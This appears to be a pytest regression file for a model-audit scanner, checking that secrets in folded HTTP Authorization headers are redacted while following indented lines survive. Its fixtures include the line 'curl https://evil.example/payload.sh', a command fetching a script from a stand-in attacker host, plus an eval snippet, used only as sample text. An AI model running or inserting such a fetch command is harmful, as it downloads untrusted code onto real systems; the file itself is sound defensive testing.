"""Regression tests for folded Authorization evidence redaction."""

import pytest

from modelaudit.scanners._evidence_redaction import REDACTED_EVIDENCE_VALUE, redact_evidence_string


@pytest.mark.parametrize("newline", ["\n", "\r\n"])
@pytest.mark.parametrize(
    "payload",
    [
        " curl https://evil.example/payload.sh",
        ' payload = eval("payload")',
    ],
)
def test_parameterized_authorization_preserves_indented_non_header_lines(newline: str, payload: str) -> None:
    text = f'Authorization: Digest response="DIGESTSECRET123456"{newline}{payload}'

    redacted = redact_evidence_string(text, max_chars=None)

    assert "DIGESTSECRET123456" not in redacted
    assert redacted == f"Authorization: {REDACTED_EVIDENCE_VALUE}{newline}{payload}"


def test_parameterized_authorization_redacts_unknown_comma_delimited_folded_parameter() -> None:
    text = (
        'Authorization: Digest username="user",\n'
        ' extensionParam="EXTENSIONSECRET123456"\n'
        " curl https://evil.example/payload.sh"
    )

    redacted = redact_evidence_string(text, max_chars=None)

    assert "EXTENSIONSECRET123456" not in redacted
    assert redacted == f"Authorization: {REDACTED_EVIDENCE_VALUE}\n curl https://evil.example/payload.sh"
